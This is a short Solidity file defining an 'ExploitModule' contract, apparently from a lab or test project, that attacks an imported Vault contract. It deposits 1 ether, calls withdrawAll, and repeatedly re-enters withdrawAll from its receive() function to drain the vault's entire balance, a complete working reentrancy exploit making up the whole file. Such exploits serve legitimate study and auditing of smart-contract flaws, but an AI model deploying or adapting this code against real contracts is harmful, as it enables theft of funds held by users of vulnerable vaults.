// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "../src/Vault.sol";

contract ExploitModule {
    Vault public targetContract;

    constructor(address _target) payable {
        targetContract = Vault(payable(_target));
    }

    function runExploit() external payable {
        // Deposit some ETH to the vault
        targetContract.deposit{value: 1 ether}();

        // Call withdrawAll to trigger the reentrancy vulnerability
        targetContract.withdrawAll();
    }

    receive() external payable {
        // Re-enter the withdrawAll function to drain the vault
        if (address(targetContract).balance > 0) {
            targetContract.withdrawAll();
        }
    }
}